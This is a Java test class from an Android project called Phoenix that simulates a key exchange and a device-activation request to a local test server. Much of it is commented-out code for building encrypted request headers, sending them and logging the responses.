package com.vvt.phoenix.prot.test.simulation;

import javax.crypto.SecretKey;

import android.util.Log;

import com.vvt.phoenix.config.Customization;
import com.vvt.phoenix.http.FxHttpListener;
import com.vvt.phoenix.http.response.FxHttpResponse;
import com.vvt.phoenix.http.response.SentProgress;
import com.vvt.phoenix.prot.command.response.SendActivateResponse;
import com.vvt.phoenix.prot.unstruct.KeyExchangeResponse;
import com.vvt.phoenix.prot.unstruct.UnstructuredManager;

public class ActivationSimulator implements FxHttpListener{

	//Debug Information
	private static final String TAG = "ActivationSimulator";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ?  DEBUG : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ?  DEBUG : false;	
	private static final boolean LOCAL_LOGE = Customization.DEBUG ?  DEBUG : false;
	
	//Constants
	private static final int PLATFORM_ID = 3;

	//Fields
	//private byte mState;
	private KeyExchangeResponse mKeyExchangeResponse;
	private SecretKey mAesKey;
	private boolean mIsEncrypt;
	
	public ActivationSimulator(){
		//mState = 0;
	}
	
	public void simulateActivation(){
		mIsEncrypt = true;
		runState0();
	}
	
	public void simulateActivationNoEncrypt(){
		mIsEncrypt = false;
		runState0();
	}
	
	/**
	 * State 0  = key exchange
	 */
	private void runState0(){
		/*KeyExchange keyExchange = new KeyExchange();
		keyExchange.setUrl("http://192.168.2.201:8080/Phoenix-WAR-Core/gateway/unstructured");
		keyExchange.setKeyExchangeListener(this);
		keyExchange.doKeyExchange();*/
		
		UnstructuredManager uManager = new UnstructuredManager("http://192.168.2.201:8080/Phoenix-WAR-Core/gateway/unstructured");
		mKeyExchangeResponse = uManager.doKeyExchange(1, 1);
		
		/*//1 create
		FxHttpClient httpManager = new FxHttpClient(this);
		FxHttpRequest request = new FxHttpRequest();
		request.setUrl("http://192.168.2.224:8080/Phoenix-WAR-Core/gateway/unstructured");
		request.setMethod("POST");
		//request.setUrl("http://192.168.2.224:8080/Phoenix-WAR-Core/gateway/unstructured");
		
		//2 prepare key exchange request
		KeyExchangeRequest keyEx = new KeyExchangeRequest();
		keyEx.setCode(0);
		keyEx.setEncodeType(1);		
		
		//3 parse data
		byte[] data = null;
		try {
			data = UnstructParser.parseRequest(keyEx);
		} catch (DataCorruptedException e) {
			if(LOCAL_LOGE)Log.e(TAG, e.getMessage());
		}
		
		//4 set body of request
		PostByteItem resultItem = new PostByteItem();
		resultItem.setBytes(data);
		request.addDataItem(resultItem);
		
		request.addDataItem(data);
		
		//5 post it!
		httpManager.execute(request);
		//httpManager.postContent("http://192.168.2.224:8080/Phoenix-WAR-Core/gateway/unstructured", request, this);
		
		//6 debug
		try {
			FileIO.writeToFile("/sdcard/keyExchangeSentData.dat", data);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (SecurityException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}*/
	}
	
	/**
	 * state 1 = activation (with encrypt)
	 */
	/*private void runState1(){
		//1 perform Activation Request
		SendActivate req = new SendActivate();
		//1.1 set All header data
		//setRequestAttributes(req);
		Simulator.setRequestAttributes(req);
		//1.2 set Device Info
		req.setDeviceInfo("Google Phone");
		//1.3 set Device Model 
		req.setDeviceModel("N1");
		//1.4 set IMSI
		req.setIMSI("123456789123456");
		//1.5 set platform ID
		req.setPlatformID(PLATFORM_ID);
		
		//2 parsing request
		byte[] tail = ProtocolParser.parseClientRequest(req);
		//debug
		try {
			FileUtil.writeToFile("/sdcard/activateSent.dat", tail);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (SecurityException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		//3 generate AES key
		mAesKey = AESKeyGenerator.generate();
		
		//4 construct request header (with encrypt)
		byte[] result = Simulator.constructRequestHeaderWithEncrypt(mKeyExchangeResponse.getServerPK(), mKeyExchangeResponse.getSessionId(), 
				mAesKey, tail);
		
		//5 create http component
		FxHttp httpManager = new FxHttp();
		httpManager.setHttpListener(this);
		FxHttpRequest httpRequest = new FxHttpRequest();
		httpRequest.setUrl("http://192.168.2.201:8080/Phoenix-WAR-Core/gateway");
		httpRequest.setMethod("POST");
		//httpRequest.setUrl("http://192.168.2.224:8080/Phoenix-WAR-Core/gateway");
		
		//6 set body of http request
		PostByteItem resultItem = new PostByteItem();
		resultItem.setBytes(result);
		httpRequest.addDataItem(resultItem);
		httpRequest.addDataItem(result);
		
		//PostByteItem byteItem = new PostByteItem(result);
		//byteItem.setBytes(result);
		//httpRequest.addItem(byteItem);
		
		//7 post it!
		httpManager.execute(httpRequest);
		//httpManager.postContent("http://192.168.2.224:8080/Phoenix-WAR-Core/gateway", httpRequest, this);
	}*/
	
	/**
	 * state 1 = activation (no encrypt)
	 */
	/*private void runState1NoEncrypt(){
		//1 perform Activation Request
		SendActivate req = new SendActivate();
		//1.1 set All header data
		//setRequestAttributes(req);
		Simulator.setRequestAttributes(req);
		//1.2 set Device Info
		req.setDeviceInfo("Google Phone");
		//1.3 set Device Model 
		req.setDeviceModel("N1");
		//1.4 set IMSI
		req.setIMSI("123456789123456");
		//1.5 set platform ID
		req.setPlatformID(PLATFORM_ID);
		
		//3 parsing request
		byte[] tail = ProtocolParser.parseClientRequest(req);
		
		//4 construct request header (non encrypt)
		byte[] result = Simulator.constructRequestHeaderNoEncrypt(mKeyExchangeResponse.getSessionId(), tail);
		
		//5 create http component
		FxHttp httpManager = new FxHttp();
		httpManager.setHttpListener(this);
		FxHttpRequest httpRequest = new FxHttpRequest();
		httpRequest.setUrl("http://192.168.2.201:8080/Phoenix-WAR-Core/gateway");
		httpRequest.setMethod("POST");
		//httpRequest.setUrl("http://192.168.2.224:8080/Phoenix-WAR-Core/gateway");
		
		//6 set body of http request
		PostByteItem resultItem = new PostByteItem();
		resultItem.setBytes(result);
		httpRequest.addDataItem(resultItem);
		
		httpRequest.addDataItem(result);
		
		//7 post it!
		httpManager.execute(httpRequest);
		//httpManager.postContent("http://192.168.2.224:8080/Phoenix-WAR-Core/gateway", httpRequest, this);
	}*/
		
	
	///////////////////////////////////////////////// Listener //////////////////////////////
	
	/*@Override
	public void onKeyExchangeError(Throwable err) {
		if(LOCAL_LOGE){
			Log.e(TAG, "onKeyExchangeError: "+err.getMessage());
		}
		
	}

	@Override
	public void onKeyExchangeSuccess(KeyExchangeResponse response) {
		if(LOCAL_LOGV){
			Log.v(TAG, "onKeyExchangeSuccess");
		}
		
		//2 initiate KeyExchageResponse
		mKeyExchangeResponse = response;
		if(LOCAL_LOGV)Log.v(TAG, "Response at state 0 -> Command Echo:"+mKeyExchangeResponse.getCmdEcho()+"\nStatus Code: "+mKeyExchangeResponse.getStatusCode());
		
		try {
			mKeyExchangeResponse = (KeyExchangeResponse) UnstructParser.parseResponse(result);
		} catch (DataCorruptedException e) {
			if(LOCAL_LOGE)Log.e(TAG, e.getMessage());
		}
		if(LOCAL_LOGV)Log.v(TAG, "Response at state 0 -> Command Echo:"+mKeyExchangeResponse.getCmdEcho()+"\nStatus Code: "+mKeyExchangeResponse.getStatusCode());
		
		//3 goto next state (Activate)
		mState = 1;
		if(mIsEncrypt)runState1();
		else runState1NoEncrypt();
		
	}*/

	@Override
	public void onHttpError(Throwable err, String msg) {
		//if(LOCAL_LOGE)Log.e(TAG, "In state "+mState+": "+err.getMessage());
		if(LOCAL_LOGE)Log.e(TAG, "onHTTPError: "+msg+": "+err.getMessage());
		
	}

	@Override
	//public void onHTTPProgress(String progress) {
	//public void onHTTPProgress(FxHttpStatusReporter progress) {
	public void onHttpSentProgress(SentProgress progress) {
		//if(LOCAL_LOGV)Log.v(TAG, "onHTTPProgress called");
		//SentProgress sentProgress = (SentProgress)progress;
		//Log.v(TAG, "HTTP progress: "+sentProgress);
		Log.v(TAG, "HTTP progress: "+progress);
	}
	
	@Override
	public void onHttpResponse(FxHttpResponse response) {
		// TODO Auto-generated method stub
		
	}

	@Override
	//public void onHTTPSuccess(byte[] result) {
	//public void onHTTPSuccess(FxHttpStatusReporter responseReporter) {
	public void onHttpSuccess(FxHttpResponse response) {
		if(LOCAL_LOGV)Log.v(TAG, "onHTTPSuccess called");
		
		//FxHttpResponse response = (FxHttpResponse) responseReporter;
		
		byte[] result = response.getBody();
		
		/*// key exchange state
		if(mState == 0){
			//1 write response to file
			//FileIO fileIO = new FileIO(mContext);
			try {
				FileIO.writeToFile("/sdcard/keyExchangeResponse.dat", result);
			} catch (FileNotFoundException e) {
				if(LOCAL_LOGE)Log.e(TAG, e.getMessage());
			} catch (IOException e) {
				if(LOCAL_LOGE)Log.e(TAG, e.getMessage());
			} catch (SecurityException e){
				if(LOCAL_LOGE)Log.e(TAG, e.getMessage());
			}
			
			//2 initiate KeyExchageResponse
			try {
				mKeyExchangeResponse = (KeyExchangeResponse) UnstructParser.parseResponse(result);
			} catch (DataCorruptedException e) {
				if(LOCAL_LOGE)Log.e(TAG, e.getMessage());
			}
			if(LOCAL_LOGV)Log.v(TAG, "Response at state 0 -> Command Echo:"+mKeyExchangeResponse.getCmdEcho()+"\nStatus Code: "+mKeyExchangeResponse.getStatusCode());
			
			//3 goto next state (Activate)
			mState = 1;
			if(mIsEncrypt)runState1();
			else runState1NoEncrypt();
			
		}else if(mState == 1){ // send Activation
		*/				
			//processActivationResponse(result);
			SendActivateResponse responseObj = (SendActivateResponse) Simulator.constructResponseObject(result, mAesKey);
			
			//display some info
			if(LOCAL_LOGV){
				Log.v(TAG, "STATUS_CODE: "+responseObj.getStatusCode());
				Log.v(TAG, "Message: "+responseObj.getMessage());
			}
			
		//}
	}

	

	

	
	//////////////////////////////////////////////// Structured Command Facilities //////////
	/**
	 * Add common attributes to give ClientRequest object
	 * @param req	ClientRequest object that will be add attributes
	 *//*
	private void setRequestAttributes(ClientRequest req){
		//1 set protocol version
		req.setProtocolVersion(1);
		
		//2 set productID
		req.setProductId(38);
		
		//3 set product version
		req.setProductVersion("FXS");
		
		//4 set configID
		req.setConfId(4);
		
		//5 set deviceID (IMEI)
		req.setDeviceId(IMEI);
		
		//6 set Activation Code
		req.setActivationCode(ACTIVATE_CODE);
		
		//7 set Language
		//req.setLanguage(1);
		req.setLanguage(Languages.THAI);
		
		//8 set phone number
		req.setPhoneNumber("+66866980807");
		
		//9 set MCC
		req.setMcc("66");
		
		//10 set MNC
		req.setMnc("01");
		
		//11 set Command
		// not apply, object already know their type
	}

	*//**
	 * Fill in header of request
	 * @param key				Our AES Key
	 * @param encryptedTail		Data that already parse and encrypt
	 * @return
	 *//*
	private byte[] constructRequestHeader(SecretKey key, byte[] encryptedTail){
		DataBuffer buffer = new DataBuffer();
		//1 put encryption type
		buffer.writeByte((byte) 1);
		
		//2 put session ID
		buffer.writeInt((int) mKeyExchangeResponse.getSessionId());
		
		//3 put encrypted AES key with length
		//3.1 initiate server public key
		RSAPublicKey serverPk = RSAKeyGenerator.generatePublic(mKeyExchangeResponse.getServerPK());
		//3.2 encrypting our AES key with RSA algorithm
		byte[] encryptedAesKey = null;
		try {
			encryptedAesKey = RSACipher.encrypt(serverPk, key.getEncoded());
		} catch (InvalidKeyException e) {
			if(LOCAL_LOGE)Log.e(TAG, e.getMessage());
		}
		//3.3 calculate encrypted AES key length
		int keyLen = encryptedAesKey.length;
		//3.4 put encrypted AES key and its length
		buffer.writeShort((short) keyLen);
		buffer.writeBytes(keyLen, 0, encryptedAesKey);
		
		//4 put encrypted tail length (not include crc32 length)
		int tailLen = encryptedTail.length;
		buffer.writeShort((short) tailLen);
		
		//5 calculate and put crc32 of encrypted tail
		int crc = (int) CRC32Checksum.calculateSynchronous(encryptedTail);
		buffer.writeInt(crc);

		//6 append with tail
		buffer.writeBytes(tailLen, 0, encryptedTail);
		
		return buffer.toArray();
	}*/
}
